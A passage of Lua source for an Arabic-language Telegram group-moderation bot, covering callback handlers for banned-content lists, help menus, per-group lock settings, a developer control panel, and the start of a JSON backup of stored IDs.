local infomsg = {Text:match("^mn_(.*)_(.*)")}
local userid = infomsg[1]
local Type  = infomsg[2]
if tonumber(data.sender_user_id) ~= tonumber(userid) then  
return bot.answerCallbackQuery(data.id,"‹ : عذرا الامر لا يخصك ", true)
end
if Type == "st" then  
ty =  "الملصقات الممنوعه"
Info_ = redis:smembers(bot_id.."mn:content:Sticker"..data.chat_id)  
t = "‹ : قائمه "..ty.." ."
if #Info_ == 0 then
return bot.answerCallbackQuery(data.id,"‹ : قائمه "..ty.." فارغه .", true)
end  
bot.answerCallbackQuery(data.id,"تم مسحها بنجاح", true)
redis:del(bot_id.."mn:content:Sticker"..data.chat_id) 
elseif Type == "tx" then  
ty =  "الكلمات الممنوعه"
Info_ = redis:smembers(bot_id.."mn:content:Text"..data.chat_id)  
t = "‹ : قائمه "..ty.." ."
if #Info_ == 0 then
return bot.answerCallbackQuery(data.id,"‹ : قائمه "..ty.." فارغه .", true)
end  
bot.answerCallbackQuery(data.id,"تم مسحها بنجاح", true)
redis:del(bot_id.."mn:content:Text"..data.chat_id) 
elseif Type == "gi" then  
 ty =  "المتحركات الممنوعه"
Info_ = redis:smembers(bot_id.."mn:content:Animation"..data.chat_id)  
t = "‹ : قائمه "..ty.." ."
if #Info_ == 0 then
return bot.answerCallbackQuery(data.id,"‹ : قائمه "..ty.." فارغه .", true)
end  
bot.answerCallbackQuery(data.id,"تم مسحها بنجاح", true)
redis:del(bot_id.."mn:content:Animation"..data.chat_id) 
elseif Type == "ph" then  
ty =  "الصور الممنوعه"
Info_ = redis:smembers(bot_id.."mn:content:Photo"..data.chat_id) 
t = "‹ : قائمه "..ty.." ."
if #Info_ == 0 then
return bot.answerCallbackQuery(data.id,"‹ : قائمه "..ty.." فارغه .", true)
end  
bot.answerCallbackQuery(data.id,"تم مسحها بنجاح", true)
redis:del(bot_id.."mn:content:Photo"..data.chat_id) 
elseif Type == "up" then  
local Photo =redis:scard(bot_id.."mn:content:Photo"..data.chat_id) 
local Animation =redis:scard(bot_id.."mn:content:Animation"..data.chat_id)  
local Sticker =redis:scard(bot_id.."mn:content:Sticker"..data.chat_id)  
local Text =redis:scard(bot_id.."mn:content:Text"..data.chat_id)  
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = 'الصور الممنوعه', data="mn_"..data.sender_user_id.."_ph"},{text = 'الكلمات الممنوعه', data="mn_"..data.sender_user_id.."_tx"}},
{{text = 'المتحركات الممنوعه', data="mn_"..data.sender_user_id.."_gi"},{text = 'الملصقات الممنوعه',data="mn_"..data.sender_user_id.."_st"}},
{{text = 'تحديث',data="mn_"..data.sender_user_id.."_up"}},
}
}
bot.editMessageText(chat_id,msg_id,"* ‹ : تحوي قائمه المنع على\n‹ : الصور ( "..Photo.." )\n‹ : الكلمات ( "..Text.." )\n‹ : الملصقات ( "..Sticker.." )\n‹ : المتحركات ( "..Animation.." )\n‹ : اضغط على القائمه المراد حذفها .*", 'md', true, false, reply_markup)
bot.answerCallbackQuery(data.id,"تم تحديث النتائج", true)
end
end
if Text == 'EndAddarray'..user_id then  
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
if redis:get(bot_id..'Set:array'..user_id..':'..chat_id) == 'true1' then
redis:del(bot_id..'Set:array'..user_id..':'..chat_id)
bot.editMessageText(chat_id,msg_id,"*‹ : تم حفظ الردود بنجاح .*", 'md', true, false, reply_markup)
else
bot.editMessageText(chat_id,msg_id," *‹ : تم تنفيذ الامر سابقا .*", 'md', true, false, reply_markup)
end
end
if Text and Text:match("^Sur_(.*)_(.*)") then
local infomsg = {Text:match("^Sur_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "‹ : الامر لا يخصك", true)
return false
end   
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
if tonumber(infomsg[2]) == 1 then
if GetInfoBot(data).BanUser == false then
bot.editMessageText(chat_id,msg_id,"* ‹ : لا يمتلك البوت صلاحيه حظر الاعضاء .*", 'md', true, false, reply_markup)
return false
end   
if not Isrank(data.sender_user_id,chat_id) then
t = "*‹ : لا يمكن للبوت حظر "..Get_Rank(data.sender_user_id,chat_id).." .*"
else
t = "*‹ : تم طردك بنجاح .*"
bot.setChatMemberStatus(chat_id,data.sender_user_id,'banned',0)
end
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_markup)
elseif tonumber(infomsg[2]) == 2 then
bot.editMessageText(chat_id,msg_id,"*‹ : تم الغاء عمليه الطرد بنجاح .*", 'md', true, false, reply_markup)
end
end
if Text and Text:match("^Amr_(.*)_(.*)") then
local infomsg = {Text:match("^Amr_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "‹ : الامر لا يخصك", true)
return false
end   
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'1'" ,data="Amr_"..data.sender_user_id.."_1"},{text ="'2'",data="Amr_"..data.sender_user_id.."_2"}},
{{text ="'3'",data="Amr_"..data.sender_user_id.."_3"},{text ="'4'",data="Amr_"..data.sender_user_id.."_4"}},
{{text = '‹ : الاوامر الرئيسيه',data="Amr_"..data.sender_user_id.."_5"}},
}
}
if infomsg[2] == '1' then
reply_markup = reply_markup
t = "*‹ : اوامر الحمايه اتبع مايلي .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : قفل ، فتح ← الامر .\n‹ : تستطيع قفل حمايه كما يلي .\n‹ : ( بالتقيد ، بالطرد ، بالكتم ، بالتقييد ) .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : تاك .\n‹ : القناه .\n‹ : الصور .\n‹ : الرابط .\n‹ : الفشار .\n‹ : الموقع .\n‹ : التكرار .\n‹ : الفيديو .\n‹ : الدخول .\n‹ : الاضافه .\n‹ : الاغاني .\n‹ : الصوت .\n‹ : الملفات .\n‹ : الرسائل .\n‹ : الدردشه .\n‹ : الجهات .\n‹ : السيلفي .\n‹ : التثبيت .\n‹ : الشارحه .\n‹ : الكلايش .\n‹ : البوتات .\n‹ : التوجيه .\n‹ : التعديل .\n‹ : الانلاين .\n‹ : المعرفات .\n‹ : الكيبورد .\n‹ : الفارسيه .\n‹ : الانكليزيه .\n‹ : الاستفتاء .\n‹ : الملصقات .\n‹ : الاشعارات .\n‹ : الماركداون .\n‹ : المتحركات .*"
elseif infomsg[2] == '2' then
reply_markup = reply_markup
t = "*‹ : اعدادات المجموعه .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : الترحيب .\n‹ : مسح الرتب .\n‹ : الغاء التثبيت .\n‹ : فحص البوت .\n‹ : تعين الرابط .\n‹ : مسح الرابط .\n‹ : تغيير الايدي .\n‹ : تعين الايدي .\n‹ : مسح الايدي .\n‹ : مسح الترحيب .\n‹ : صورتي .\n‹ : تغيير اسم المجموعه .\n‹ : تعين قوانين .\n‹ : تغيير الوصف .\n‹ : مسح القوانين .\n‹ : تنظيف التعديل .\n‹ : تنظيف الميديا .\n‹ : مسح الرابط .\n‹ : رفع الادمنيه .\n‹ : تعين ترحيب .\n‹ : الترحيب .\n‹ : الالعاب الاحترافيه .\n‹ : المجموعه .*"
elseif infomsg[2] == '3' then
reply_markup = reply_markup
t = "*‹ : اوامر التفعيل والتعطيل .\n‹ : تفعيل/تعطيل الامر اسفل .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : اوامر التسليه .\n‹ : الالعاب الاحترافيه .\n‹ : الطرد .\n‹ : الحظر .\n‹ : الرفع .\n‹ : المميزات .\n‹ : المسح التلقائي .\n‹ : ٴall .\n‹ : منو ضافني .\n‹ : تفعيل الردود .\n‹ : الايدي بالصوره .\n‹ : الايدي .\n‹ : التنظيف .\n‹ : الترحيب .\n‹ : الرابط .\n‹ : البايو .\n‹ : صورتي .\n‹ : الالعاب .*"
elseif infomsg[2] == '4' then
reply_markup = reply_markup
t = "*‹ : اوامر اخرى .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : الالعاب الاحترافيه .\n‹ : المجموعه .\n‹ : الرابط .\n‹ : اسمي .\n‹ : ايديي .\n‹ : مسح نقاطي .\n‹ : نقاطي .\n‹ : مسح رسائلي .\n‹ : رسائلي .\n‹ : مسح جهاتي .\n‹ : مسح بالرد .\n‹ : تفاعلي .\n‹ : جهاتي .\n‹ : مسح سحكاتي .\n‹ : سحكاتي .\n‹ : رتبتي .\n‹ : معلوماتي .\n‹ : المنشئ .\n‹ : رفع المنشئ .\n‹ : البايو/نبذتي .\n‹ : التاريخ/الساعه .\n‹ : رابط الحذف .\n‹ : الالعاب .\n‹ : منع بالرد .\n‹ : منع .\n‹ : تنظيف + عدد .\n‹ : قائمه المنع .\n‹ : مسح قائمه المنع .\n‹ : مسح الاوامر المضافه .\n‹ : الاوامر المضافه .\n‹ : ترتيب الاوامر .\n‹ : اضف امر .\n‹ : حذف امر .\n‹ : اضف رد .\n‹ : حذف رد .\n‹ : ردود المدير .\n‹ : مسح ردود المدير .\n‹ : الردود المتعدده .\n‹ : مسح الردود المتعدده .\n‹ : وضع عدد المسح +رقم .\n‹ : مسح البوتات .\n‹ : ٴall .\n‹ : غنيلي، فلم ، متحركه ، رمزيه ، فيديو .\n‹ : تغير رد العضو ، المميز ، الادمن ، المدير ، المنشئ ، المنشئ الاساسي. المالك ، المطور .\n‹ : حذف رد العضو ، المميز ، الادمن ، المدير ، المنشئ المنشئ الاساسي ، المالك المطور .*"
elseif infomsg[2] == '5' then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'1'" ,data="Amr_"..data.sender_user_id.."_1"},{text ="'2'",data="Amr_"..data.sender_user_id.."_2"}},
{{text ="'3'",data="Amr_"..data.sender_user_id.."_3"},{text ="'4'",data="Amr_"..data.sender_user_id.."_4"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
t = "*‹ : قائمه الاوامر .\n *ٴ━═━═━═━═━═━═━═━ *\n‹ : م1 اوامر الحمايه .\n‹ : م2 اوامر إعدادات المجموعه .\n‹ : م3 اوامر القفل والفتح .\n‹ : م4 اوامر اخرى .*"
end
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_markup)
end
----------------------------------------------------------------------------------------------------
if Text and Text:match("^GetSeBk_(.*)_(.*)") then
local infomsg = {Text:match("^GetSeBk_(.*)_(.*)")}
num = tonumber(infomsg[1])
any = tonumber(infomsg[2])
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "‹ : الامر لا يخصك", true)
return false
end  
if any == 0 then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الكيبورد'" ,data="GetSe_"..user_id.."_Keyboard"},{text = GetSetieng(chat_id).Keyboard ,data="GetSe_"..user_id.."_Keyboard"}},
{{text = "'الملصقات'" ,data="GetSe_"..user_id.."_messageSticker"},{text =GetSetieng(chat_id).messageSticker,data="GetSe_"..user_id.."_messageSticker"}},
{{text = "'الاغاني'" ,data="GetSe_"..user_id.."_messageVoiceNote"},{text =GetSetieng(chat_id).messageVoiceNote,data="GetSe_"..user_id.."_messageVoiceNote"}},
{{text = "'الانكليزي'" ,data="GetSe_"..user_id.."_WordsEnglish"},{text =GetSetieng(chat_id).WordsEnglish,data="GetSe_"..user_id.."_WordsEnglish"}},
{{text = "'الفارسيه'" ,data="GetSe_"..user_id.."_WordsPersian"},{text =GetSetieng(chat_id).WordsPersian,data="GetSe_"..user_id.."_WordsPersian"}},
{{text = "'الدخول'" ,data="GetSe_"..user_id.."_JoinByLink"},{text =GetSetieng(chat_id).JoinByLink,data="GetSe_"..user_id.."_JoinByLink"}},
{{text = "'الصور'" ,data="GetSe_"..user_id.."_messagePhoto"},{text =GetSetieng(chat_id).messagePhoto,data="GetSe_"..user_id.."_messagePhoto"}},
{{text = "'الفيديو'" ,data="GetSe_"..user_id.."_messageVideo"},{text =GetSetieng(chat_id).messageVideo,data="GetSe_"..user_id.."_messageVideo"}},
{{text = "'الجهات'" ,data="GetSe_"..user_id.."_messageContact"},{text =GetSetieng(chat_id).messageContact,data="GetSe_"..user_id.."_messageContact"}},
{{text = "'السيلفي'" ,data="GetSe_"..user_id.."_messageVideoNote"},{text =GetSetieng(chat_id).messageVideoNote,data="GetSe_"..user_id.."_messageVideoNote"}},
{{text = "'➡️'" ,data="GetSeBk_"..user_id.."_1"}},
}
}
elseif any == 1 then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الاستفتاء'" ,data="GetSe_"..user_id.."_messagePoll"},{text =GetSetieng(chat_id).messagePoll,data="GetSe_"..user_id.."_messagePoll"}},
{{text = "'الصوت'" ,data="GetSe_"..user_id.."_messageAudio"},{text =GetSetieng(chat_id).messageAudio,data="GetSe_"..user_id.."_messageAudio"}},
{{text = "'الملفات'" ,data="GetSe_"..user_id.."_messageDocument"},{text =GetSetieng(chat_id).messageDocument,data="GetSe_"..user_id.."_messageDocument"}},
{{text = "'المتحركات'" ,data="GetSe_"..user_id.."_messageAnimation"},{text =GetSetieng(chat_id).messageAnimation,data="GetSe_"..user_id.."_messageAnimation"}},
{{text = "'الاضافه'" ,data="GetSe_"..user_id.."_AddMempar"},{text =GetSetieng(chat_id).AddMempar,data="GetSe_"..user_id.."_AddMempar"}},
{{text = "'التثبيت'" ,data="GetSe_"..user_id.."_messagePinMessage"},{text =GetSetieng(chat_id).messagePinMessage,data="GetSe_"..user_id.."_messagePinMessage"}},
{{text = "'القناه'" ,data="GetSe_"..user_id.."_messageSenderChat"},{text = GetSetieng(chat_id).messageSenderChat ,data="GetSe_"..user_id.."_messageSenderChat"}},
{{text = "'الشارحه'" ,data="GetSe_"..user_id.."_Cmd"},{text =GetSetieng(chat_id).Cmd,data="GetSe_"..user_id.."_Cmd"}},
{{text = "'الموقع'" ,data="GetSe_"..user_id.."_messageLocation"},{text = GetSetieng(chat_id).messageLocation ,data="GetSe_"..user_id.."_messageLocation"}},
{{text = "'التكرار'" ,data="GetSe_"..user_id.."_flood"},{text = GetSetieng(chat_id).flood ,data="GetSe_"..user_id.."_flood"}},
{{text = "'⬅️'" ,data="GetSeBk_"..user_id.."_0"},{text = "'➡️'" ,data="GetSeBk_"..user_id.."_2"}},
}
}
elseif any == 2 then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الكلايش'" ,data="GetSe_"..user_id.."_Spam"},{text =GetSetieng(chat_id).Spam,data="GetSe_"..user_id.."_Spam"}},
{{text = "'التعديل'" ,data="GetSe_"..user_id.."_Edited"},{text = GetSetieng(chat_id).Edited ,data="GetSe_"..user_id.."_Edited"}},
{{text = "'التاك'" ,data="GetSe_"..user_id.."_Hashtak"},{text =GetSetieng(chat_id).Hashtak,data="GetSe_"..user_id.."_Hashtak"}},
{{text = "'الانلاين'" ,data="GetSe_"..user_id.."_via_bot_user_id"},{text = GetSetieng(chat_id).via_bot_user_id ,data="GetSe_"..user_id.."_via_bot_user_id"}},
{{text = "'البوتات'" ,data="GetSe_"..user_id.."_messageChatAddMembers"},{text =GetSetieng(chat_id).messageChatAddMembers,data="GetSe_"..user_id.."_messageChatAddMembers"}},
{{text = "'التوجيه'" ,data="GetSe_"..user_id.."_forward_info"},{text = GetSetieng(chat_id).forward_info ,data="GetSe_"..user_id.."_forward_info"}},
{{text = "'الروابط'" ,data="GetSe_"..user_id.."_Links"},{text =GetSetieng(chat_id).Links,data="GetSe_"..user_id.."_Links"}},
{{text = "'الماركداون'" ,data="GetSe_"..user_id.."_Markdaun"},{text = GetSetieng(chat_id).Markdaun ,data="GetSe_"..user_id.."_Markdaun"}},
{{text = "'الفشار'" ,data="GetSe_"..user_id.."_WordsFshar"},{text =GetSetieng(chat_id).WordsFshar,data="GetSe_"..user_id.."_WordsFshar"}},
{{text = "'الاشعارات'" ,data="GetSe_"..user_id.."_Tagservr"},{text = GetSetieng(chat_id).Tagservr ,data="GetSe_"..user_id.."_Tagservr"}},
{{text = "'المعرفات'" ,data="GetSe_"..user_id.."_Username"},{text =GetSetieng(chat_id).Username,data="GetSe_"..user_id.."_Username"}},
{{text = "'⬅️'" ,data="GetSeBk_"..user_id.."_1"},{text = "'أوامر التفعيل'" ,data="GetSeBk_"..user_id.."_3"}},
}
}
elseif any == 3 then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'اطردني'" ,data="GetSe_"..user_id.."_kickme"},{text =redis_get(chat_id,"kickme"),data="GetSe_"..user_id.."_kickme"}},
{{text = "'البايو'" ,data="GetSe_"..user_id.."_GetBio"},{text =redis_get(chat_id,"GetBio"),data="GetSe_"..user_id.."_GetBio"}},
{{text = "'الرابط'" ,data="GetSe_"..user_id.."_link"},{text =redis_get(chat_id,"link"),data="GetSe_"..user_id.."_link"}},
{{text = "'الترحيب'" ,data="GetSe_"..user_id.."_Welcome"},{text =redis_get(chat_id,"Welcome"),data="GetSe_"..user_id.."_Welcome"}},
{{text = "'الايدي'" ,data="GetSe_"..user_id.."_id"},{text =redis_get(chat_id,"id"),data="GetSe_"..user_id.."_id"}},
{{text = "'الايدي بالصوره'" ,data="GetSe_"..user_id.."_id:ph"},{text =redis_get(chat_id,"id:ph"),data="GetSe_"..user_id.."_id:ph"}},
{{text = "'التنظيف'" ,data="GetSe_"..user_id.."_delmsg"},{text =redis_get(chat_id,"delmsg"),data="GetSe_"..user_id.."_delmsg"}},
{{text = "'التسليه'" ,data="GetSe_"..user_id.."_entertainment"},{text =redis_get(chat_id,"entertainment"),data="GetSe_"..user_id.."_entertainment"}},
{{text = "'الالعاب الاحترافيه'" ,data="GetSe_"..user_id.."_gameVip"},{text =redis_get(chat_id,"gameVip"),data="GetSe_"..user_id.."_gameVip"}},
{{text = "'ضافني'" ,data="GetSe_"..user_id.."_addme"},{text =redis_get(chat_id,"addme"),data="GetSe_"..user_id.."_addme"}},
{{text = "'الردود'" ,data="GetSe_"..user_id.."_Reply"},{text =redis_get(chat_id,"Reply"),data="GetSe_"..user_id.."_Reply"}},
{{text = "'الالعاب'" ,data="GetSe_"..user_id.."_game"},{text =redis_get(chat_id,"game"),data="GetSe_"..user_id.."_game"}},
{{text = "'صورتي'" ,data="GetSe_"..user_id.."_phme"},{text =redis_get(chat_id,"phme"),data="GetSe_"..user_id.."_phme"}},
{{text = "'⬅️'" ,data="GetSeBk_"..user_id.."_2"}}
}
}
end
bot.editMessageText(chat_id,msg_id,"*‹ : اعدادات المجموعه  .*", 'md', true, false, reply_markup)
end
if Text and Text:match("^GetSe_(.*)_(.*)") then
local infomsg = {Text:match("^GetSe_(.*)_(.*)")}
ifd = infomsg[1]
Amr = infomsg[2]
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "‹ : الامر لا يخصك", true)
return false
end  
if not redis:get(bot_id..":"..chat_id..":settings:"..Amr) then
redis:set(bot_id..":"..chat_id..":settings:"..Amr,"del")    
elseif redis:get(bot_id..":"..chat_id..":settings:"..Amr) == "del" then 
redis:set(bot_id..":"..chat_id..":settings:"..Amr,"ktm")    
elseif redis:get(bot_id..":"..chat_id..":settings:"..Amr) == "ktm" then 
redis:set(bot_id..":"..chat_id..":settings:"..Amr,"ked")    
elseif redis:get(bot_id..":"..chat_id..":settings:"..Amr) == "ked" then 
redis:set(bot_id..":"..chat_id..":settings:"..Amr,"kick")    
elseif redis:get(bot_id..":"..chat_id..":settings:"..Amr) == "kick" then 
redis:del(bot_id..":"..chat_id..":settings:"..Amr)    
end   
if Amr == "messageVideoNote" or Amr == "messageVoiceNote" or Amr == "messageSticker" or Amr == "Keyboard" or Amr == "JoinByLink" or Amr == "WordsPersian" or Amr == "WordsEnglish" or Amr == "messageContact" or Amr == "messageVideo" or Amr == "messagePhoto" then 
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الكيبورد'" ,data="GetSe_"..user_id.."_Keyboard"},{text = GetSetieng(chat_id).Keyboard ,data="GetSe_"..user_id.."_Keyboard"}},
{{text = "'الملصقات'" ,data="GetSe_"..user_id.."_messageSticker"},{text =GetSetieng(chat_id).messageSticker,data="GetSe_"..user_id.."_messageSticker"}},
{{text = "'الاغاني'" ,data="GetSe_"..user_id.."_messageVoiceNote"},{text =GetSetieng(chat_id).messageVoiceNote,data="GetSe_"..user_id.."_messageVoiceNote"}},
{{text = "'الانكليزي'" ,data="GetSe_"..user_id.."_WordsEnglish"},{text =GetSetieng(chat_id).WordsEnglish,data="GetSe_"..user_id.."_WordsEnglish"}},
{{text = "'الفارسيه'" ,data="GetSe_"..user_id.."_WordsPersian"},{text =GetSetieng(chat_id).WordsPersian,data="GetSe_"..user_id.."_WordsPersian"}},
{{text = "'الدخول'" ,data="GetSe_"..user_id.."_JoinByLink"},{text =GetSetieng(chat_id).JoinByLink,data="GetSe_"..user_id.."_JoinByLink"}},
{{text = "'الصور'" ,data="GetSe_"..user_id.."_messagePhoto"},{text =GetSetieng(chat_id).messagePhoto,data="GetSe_"..user_id.."_messagePhoto"}},
{{text = "'الفيديو'" ,data="GetSe_"..user_id.."_messageVideo"},{text =GetSetieng(chat_id).messageVideo,data="GetSe_"..user_id.."_messageVideo"}},
{{text = "'الجهات'" ,data="GetSe_"..user_id.."_messageContact"},{text =GetSetieng(chat_id).messageContact,data="GetSe_"..user_id.."_messageContact"}},
{{text = "'السيلفي'" ,data="GetSe_"..user_id.."_messageVideoNote"},{text =GetSetieng(chat_id).messageVideoNote,data="GetSe_"..user_id.."_messageVideoNote"}},
{{text = "'➡️'" ,data="GetSeBk_"..user_id.."_1"}},
}
}
elseif Amr == "messagePoll" or Amr == "messageAudio" or Amr == "messageDocument" or Amr == "messageAnimation" or Amr == "AddMempar" or Amr == "messagePinMessage" or Amr == "messageSenderChat" or Amr == "Cmd" or Amr == "messageLocation" or Amr == "flood" then 
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الاستفتاء'" ,data="GetSe_"..user_id.."_messagePoll"},{text =GetSetieng(chat_id).messagePoll,data="GetSe_"..user_id.."_messagePoll"}},
{{text = "'الصوت'" ,data="GetSe_"..user_id.."_messageAudio"},{text =GetSetieng(chat_id).messageAudio,data="GetSe_"..user_id.."_messageAudio"}},
{{text = "'الملفات'" ,data="GetSe_"..user_id.."_messageDocument"},{text =GetSetieng(chat_id).messageDocument,data="GetSe_"..user_id.."_messageDocument"}},
{{text = "'المتحركات'" ,data="GetSe_"..user_id.."_messageAnimation"},{text =GetSetieng(chat_id).messageAnimation,data="GetSe_"..user_id.."_messageAnimation"}},
{{text = "'الاضافه'" ,data="GetSe_"..user_id.."_AddMempar"},{text =GetSetieng(chat_id).AddMempar,data="GetSe_"..user_id.."_AddMempar"}},
{{text = "'التثبيت'" ,data="GetSe_"..user_id.."_messagePinMessage"},{text =GetSetieng(chat_id).messagePinMessage,data="GetSe_"..user_id.."_messagePinMessage"}},
{{text = "'القناه'" ,data="GetSe_"..user_id.."_messageSenderChat"},{text = GetSetieng(chat_id).messageSenderChat ,data="GetSe_"..user_id.."_messageSenderChat"}},
{{text = "'الشارحه'" ,data="GetSe_"..user_id.."_Cmd"},{text =GetSetieng(chat_id).Cmd,data="GetSe_"..user_id.."_Cmd"}},
{{text = "'الموقع'" ,data="GetSe_"..user_id.."_messageLocation"},{text = GetSetieng(chat_id).messageLocation ,data="GetSe_"..user_id.."_messageLocation"}},
{{text = "'التكرار'" ,data="GetSe_"..user_id.."_flood"},{text = GetSetieng(chat_id).flood ,data="GetSe_"..user_id.."_flood"}},
{{text = "'⬅️'" ,data="GetSeBk_"..user_id.."_0"},{text = "'➡️'" ,data="GetSeBk_"..user_id.."_2"}},
}
}
elseif Amr == "Edited" or Amr == "Spam" or Amr == "Hashtak" or Amr == "via_bot_user_id" or Amr == "forward_info" or Amr == "messageChatAddMembers" or Amr == "Links" or Amr == "Markdaun" or Amr == "Username" or Amr == "Tagservr" or Amr == "WordsFshar" then  
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الكلايش'" ,data="GetSe_"..user_id.."_Spam"},{text =GetSetieng(chat_id).Spam,data="GetSe_"..user_id.."_Spam"}},
{{text = "'التعديل'" ,data="GetSe_"..user_id.."_Edited"},{text = GetSetieng(chat_id).Edited ,data="GetSe_"..user_id.."_Edited"}},
{{text = "'التاك'" ,data="GetSe_"..user_id.."_Hashtak"},{text =GetSetieng(chat_id).Hashtak,data="GetSe_"..user_id.."_Hashtak"}},
{{text = "'الانلاين'" ,data="GetSe_"..user_id.."_via_bot_user_id"},{text = GetSetieng(chat_id).via_bot_user_id ,data="GetSe_"..user_id.."_via_bot_user_id"}},
{{text = "'البوتات'" ,data="GetSe_"..user_id.."_messageChatAddMembers"},{text =GetSetieng(chat_id).messageChatAddMembers,data="GetSe_"..user_id.."_messageChatAddMembers"}},
{{text = "'التوجيه'" ,data="GetSe_"..user_id.."_forward_info"},{text = GetSetieng(chat_id).forward_info ,data="GetSe_"..user_id.."_forward_info"}},
{{text = "'الروابط'" ,data="GetSe_"..user_id.."_Links"},{text =GetSetieng(chat_id).Links,data="GetSe_"..user_id.."_Links"}},
{{text = "'الماركداون'" ,data="GetSe_"..user_id.."_Markdaun"},{text = GetSetieng(chat_id).Markdaun ,data="GetSe_"..user_id.."_Markdaun"}},
{{text = "'الفشار'" ,data="GetSe_"..user_id.."_WordsFshar"},{text =GetSetieng(chat_id).WordsFshar,data="GetSe_"..user_id.."_WordsFshar"}},
{{text = "'الاشعارات'" ,data="GetSe_"..user_id.."_Tagservr"},{text = GetSetieng(chat_id).Tagservr ,data="GetSe_"..user_id.."_Tagservr"}},
{{text = "'المعرفات'" ,data="GetSe_"..user_id.."_Username"},{text =GetSetieng(chat_id).Username,data="GetSe_"..user_id.."_Username"}},
{{text = "'⬅️'" ,data="GetSeBk_"..user_id.."_2"},{text = "'أوامر التفعيل'" ,data="GetSeBk_"..user_id.."_3"}},
}
}
end
bot.editMessageText(chat_id,msg_id,"*‹ : اعدادات المجموعه  .*", 'md', true, false, reply_markup)
end
---
if devB(data.sender_user_id) then
if Text == "Can" then
redis:del(bot_id..":set:"..chat_id..":UpfJson") 
redis:del(bot_id..":set:"..chat_id..":send") 
redis:del(bot_id..":set:"..chat_id..":dev") 
redis:del(bot_id..":set:"..chat_id..":namebot") 
redis:del(bot_id..":set:"..chat_id..":start") 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
 {{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
end
if Text == "UpfJson" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : رجوع',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : قم بأعاده ارسال الملف الخاص بالنسخه .*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":UpfJson",true) 
end
if Text == "GetfJson" then
bot.answerCallbackQuery(data.id, "‹ : جار ارسال النسخه .", true)
local list = redis:smembers(bot_id..":Groups")
local developer = redis:smembers(bot_id..":Status:developer")
local programmer = redis:smembers(bot_id..":Status:programmer") 
local t = '{"idbot": '..bot_id..',"GrBot":{'  
user_idf = redis:smembers(bot_id..":user_id")
if #user_idf ~= 0 then 
t = t..'"user_id":['
for k,v in pairs(user_idf) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
if #list ~= 0 then 
t = t..',"Groups":['
for k,v in pairs(list) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
if #programmer ~= 0 then 
t = t..',"programmer":['
for k,v in pairs(programmer) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
if #developer ~= 0 then 
t = t..',"developer":['
